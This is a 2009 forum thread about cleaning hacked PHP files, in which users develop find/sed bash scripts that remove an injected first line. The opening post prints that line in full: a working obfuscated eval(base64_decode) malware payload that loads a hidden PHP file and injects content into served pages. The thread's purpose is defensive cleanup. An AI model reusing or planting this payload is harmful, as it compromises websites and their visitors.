---
title: "Text String Search and Delete in Files"
date: 2009-05-04
forum: Programming Talk
---

### Post by whiteraven on 2009-05-04
Could anyone tell me how to search for a string (see example below) and delete it from multiple files in multiple directories? I have a rather urgent need to do this and have not found any satisfactory solutions. A forum I help manage got hacked and we need to remove the injected code from all PHP files in directories and nested directories. The code was inserted at the beginning of each file, and when deleted cannot leave whitespace at the top of the file. Any help would be greatly appreciated.

Sample Code (has spaces in it):

```
<?php /**/eval(base64_decode('aWYoZnVuY3Rpb25fZXhpc3RzKCdvYl9zdGFydCcpJiYhaXNzZXQoJEdMT0JBTFNbJ3NoX25vJ10pKXskR0xPQkFMU1snc2hfbm8nXT0xO2lmKGZpbGVfZXhpc3RzKCcvaG9tZS9uZXVobzMvcHVibGljX2h0bWwvd2t1cC9wbHVnaW5zL2VkaXRvcnMvamNlL3RpbnlfbWNlL3RoZW1lcy9hZHZhbmNlZC9za2lucy9kaWFsb2cvY2xhc3NpY2JsdWUvY3NzL3N0eWxlLmNzcy5waHAnKSl7aW5jbHVkZV9vbmNlKCcvaG9tZS9uZXVobzMvcHVibGljX2h0bWwvd2t1cC9wbHVnaW5zL2VkaXRvcnMvamNlL3RpbnlfbWNlL3RoZW1lcy9hZHZhbmNlZC9za2lucy9kaWFsb2cvY2xhc3NpY2JsdWUvY3NzL3N0eWxlLmNzcy5waHAnKTtpZihmdW5jdGlvbl9leGlzdHMoJ2dtbCcpJiYhZnVuY3Rpb25fZXhpc3RzKCdkZ29iaCcpKXtpZighZnVuY3Rpb25fZXhpc3RzKCdnemRlY29kZScpKXtmdW5jdGlvbiBnemRlY29kZSgkZCl7JGY9b3JkKHN1YnN0cigkZCwzLDEpKTskaD0xMDskZT0wO2lmKCRmJjQpeyRlPXVucGFjaygndicsc3Vic3RyKCRkLDEwLDIpKTskZT0kZVsxXTskaCs9MiskZTt9aWYoJGYmOCl7JGg9c3RycG9zKCRkLGNocigwKSwkaCkrMTt9aWYoJGYmMTYpeyRoPXN0cnBvcygkZCxjaHIoMCksJGgpKzE7fWlmKCRmJjIpeyRoKz0yO30kdT1nemluZmxhdGUoc3Vic3RyKCRkLCRoKSk7aWYoJHU9PT1GQUxTRSl7JHU9JGQ7fXJldHVybiAkdTt9fWZ1bmN0aW9uIGRnb2JoKCRiKXtIZWFkZXIoJ0NvbnRlbnQtRW5jb2Rpbmc6IG5vbmUnKTskYz1nemRlY29kZSgkYik7aWYocHJlZ19tYXRjaCgnL1w8Ym9keS9zaScsJGMpKXtyZXR1cm4gcHJlZ19yZXBsYWNlKCcvKFw8Ym9keVteXD5dKlw+KS9zaScsJyQxJy5nbWwoKSwkYyk7fWVsc2V7cmV0dXJuIGdtbCgpLiRjO319b2Jfc3RhcnQoJ2Rnb2JoJyk7fX19')); ?>
```

---

### Post by cmnorton on 2009-05-04
Using a combination of find, sed, and mv. Basically, you would need to write a shell script.

for curr_dir in `find /home/my-acct`; do
cd $curr_dir
<sed the file with output to another file>
<mv the output file back to original file name>
done


There's a lot more than what I've put down. This is just a beginning.

---

### Post by whiteraven on 2009-05-04
Admittedly I'm more than a little weak in shell scripting. Hate to be a bother, but if "This is just a beginning", I'll need more assistance. I did find some command line implementations using grep and sed, but I couldn't figure out how to adapt them to my circumstances. I am doing some reading to understand those tools, but I'm in a bit of a hurry, so I was hoping to get a good solution to fix the issues, then continue skill building by reading and working with grep, sed, etc., and store the solutions for later use. I'm certain this won't be the last time something like this will be needed.

Thanks in advance!

---

### Post by kaibob on 2009-05-04
Your best bet to get a workable and safe solution is to request that the moderators move this thread to the programming forum. There are a lot of smart and experienced people there, and this sort of stuff is easy for them.

I decided to give it a try just to learn a bit and came up with the script below. It does appear to work, but I am not experienced with this sort of thing, and my script could do more harm than good. 

```
#!/bin/bash
find /target/directory -name '*.PHP' -type f | while read FILE
do
sed -i '/search words/ d' "$FILE"
done
```

If "beginning of each file" means first line of each file, you could instead use the following sed line in the above script:

```
sed -i 1d "$FILE"
```

If you use this shell script, be sure to have backups of all files.  

REFERENCE
[http://snipplr.com/view/6152/delete-specific-line-from-a-file-with-sed/](http://snipplr.com/view/6152/delete-specific-line-from-a-file-with-sed/)

---

### Post by whiteraven on 2009-05-04
> "...a workable and safe solution is to request that the moderators move this thread to the programming forum. There are a lot of smart and experienced people there, and this sort of stuff is easy for them."

Thanks for the suggestion kaibob - Moderators, could you please move this thread to the Other Community Discussions/Development and Programming forum?

Meanwhile I'll try to get my head around your script and see if I can't get it to work. Most importantly, it can't leave whitespace at the top of some of the scripts.

Would appreciate any other ideas - gotta get this done sometime real soon!

---

### Post by kaibob on 2009-05-05
whiteraven. Is the line that you want deleted from the files always the first line in the file? This makes a difference.

---

### Post by whiteraven on 2009-05-05
Yes, it's always the first line. I've been reading and have come up with a modification of your code. What do you think? Is it recursive? There are several levels of subdirectories

```
#!/bin/bash
find /target_directory -name '*.PHP' -type f | while read FILE
do
sed -i '/base64_decode/ 1 d' "$FILE"
done
```

---

### Post by kaibob on 2009-05-05
> **whiteraven said:**
> Yes, it's always the first line. I've been reading and have come up with a modification of your code. What do you think? Is it recursive? There are several levels of subdirectories

```
#!/bin/bash
find /target_directory -name '*.PHP' -type f | while read FILE
do
sed -i '/base64_decode/ 1 d' "$FILE"
done
```

I don't believe that will work, but you can give it a try. If you want to delete the first line in every file, then the shell script contained below will do what you want. It does act recursively on every PHP file in the /target/directory and subdirectories. Also, it does not leave a blank line. 

Be sure you have backups of all files.

```
#!/bin/bash
find /target/directory -name '*.PHP' -type f | while read FILE
do
sed -i 1d "$FILE"
done
```

---

### Post by whiteraven on 2009-05-05
I think you're close, except that not all the PHP files are infected. I thought they all were, but there are a few random ones that aren't. Hence the need for the search parameter I stuck in my revision of your original script. The first line always has base64_decode in it if it's the junk this jerk spewed all through the PHP files.

Back to my revision, do you have an opinion?

---

### Post by kaibob on 2009-05-05
> **whiteraven said:**
> I think you're close, except that not all the PHP files are infected. I thought they all were, but there are a few random ones that aren't....

In that case, I would use my original shell script which deletes only those lines containing specific text (i.e. "search words"). If there is a possibility that this might delete lines that need to be retained, you may want to use something similar to the following, which checks the first line of each file for base64_decode:

```
#!/bin/bash

find /target/directory -name '*.PHP' -type f | while read FILE ; do
	CHECK=$(head -n 1 "$FILE" | grep base64_decode)
	if [ "$CHECK" != "" ] ; then
		sed -i 1d "$FILE"
	fi
done
```

As before, keep backups of all files. 

I see that the mod's have now moved this thread to the Programming Talk forum. Hopefully, some of the more knowledgeable members of the forum will be able to help.

---

### Post by whiteraven on 2009-05-05
Yup, that did it! Thanks a million, and I learned a few things along the way. Hopefully I can "pay it forward" someday.

Now, how do I mark this thread as solved? Probably right in front of me, but I just don't see it...

---

### Post by kaibob on 2009-05-05
> **whiteraven said:**
> Now, how do I mark this thread as solved? Probably right in front of me, but I just don't see it...

To mark a thread as solved, edit your first post in this thread and insert [SOLVED] in the subject line. I believe to get to this point you have to click on edit and then advanced something-or-other.

---

